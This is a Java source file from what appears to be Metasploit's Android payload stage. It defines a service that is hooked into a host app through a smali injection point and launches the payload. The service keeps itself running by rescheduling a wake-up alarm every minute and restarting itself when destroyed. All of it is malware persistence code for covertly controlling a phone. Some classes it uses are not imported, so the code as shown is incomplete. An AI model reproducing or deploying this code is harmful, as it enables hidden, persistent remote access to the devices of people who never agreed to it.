package com.metasploit.stage;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.lang.reflect.Method;

public class MainService extends Service {

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            // No context
            return;
        }
        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        if (context == null) {
            // Post to the UI/Main thread and try and retrieve the Context
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startService(context);
                        }
                    } catch (Exception e) {
                    }
                }
            });
        } else {
            startService(context);
        }
    }

    // Smali hook point
    public static void start() {
        try {
            findContext();
        } catch (Exception e) {
        }
    }

    public static void startService(Context context) {
        context.startService(new Intent(context, MainService.class));
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Payload.start(this);
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
        int restarttime = 60 * 1000; // one minute
        long triggerAtTime = SystemClock.elapsedRealtime() + restarttime;
        Intent i = new Intent("METASPLOIT");
        PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, 0);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        return START_STICKY;
    }
    @Override
    public void onDestroy() {
        Intent localIntent = new Intent();      
        localIntent.setClass(this, MainService.class);
        this.startService(localIntent);
    }


}
